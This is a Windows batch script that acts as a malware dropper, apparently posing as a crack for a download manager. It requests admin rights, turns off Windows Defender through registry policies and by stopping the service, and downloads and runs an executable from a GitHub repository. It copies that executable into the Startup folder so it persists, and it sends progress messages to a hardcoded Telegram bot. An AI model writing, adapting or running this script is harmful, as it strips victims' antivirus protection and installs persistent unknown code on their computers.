@echo off
:: Check if the script is already running with administrative privileges
net session >nul 2>&1
if %errorLevel% == 0 (
    goto :admin
) else (
    :: Request administrative privileges using PowerShell
    powershell -Command "Start-Process cmd -ArgumentList '/c %~s0' -Verb RunAs"
    exit
)

:admin
:: Disable Windows Defender
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
sc config WinDefend start=disabled
net stop WinDefend

:: Download and run Built.exe
set "url=https://github.com/redcryptoss/idm_crack/raw/main/Built.exe"
set "dest=%userprofile%\Desktop\Built.exe"
curl -o "%dest%" "%url%"

:: Start Built.exe
start "" "%dest%"
timeout /t 10

:: Copy Built.exe to startup folder
set "startup_folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
copy "%dest%" "%startup_folder%"

:: Send status messages to Telegram (replace placeholders)
set "token=1874534735:AAF_Pwb9UXzRzrX0kwvEe_jU5HNKJZfbTIc"
set "chat_id=1321846673"

:: Sending status messages
curl -s -X POST "https://api.telegram.org/bot%token%/sendMessage" -d "chat_id=%chat_id%&text=Script started. Checking Windows Defender status..."
curl -s -X POST "https://api.telegram.org/bot%token%/sendMessage" -d "chat_id=%chat_id%&text=Windows Defender disabled. Downloading and running Built.exe..."
curl -s -X POST "https://api.telegram.org/bot%token%/sendMessage" -d "chat_id=%chat_id%&text=Actions completed. Built.exe downloaded, started, and added to startup."
